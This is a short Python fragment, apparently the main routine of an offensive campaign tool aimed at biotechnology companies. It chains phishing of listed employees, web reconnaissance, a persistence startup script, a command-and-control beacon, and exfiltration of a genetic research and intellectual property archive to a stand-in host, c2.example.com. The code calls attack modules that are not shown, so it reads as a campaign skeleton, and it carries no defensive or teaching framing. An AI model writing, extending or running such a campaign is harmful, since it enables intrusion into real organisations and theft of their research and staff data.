...
def main():
    """
    Main function to run the biotechnology_company_campaign campaign.
    """
    print(f"[*] Starting biotechnology_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("biotechnology_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target biotechnology_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/genetic_research_and_intellectual_property_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-BIOTECHNOLOGY_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("genetic_research_and_intellectual_property/genetic_research_and_intellectual_property.zip", "https://c2.example.com/upload")
    run_tool("payloads/genetic_research_and_intellectual_property_exfiltrator.py")
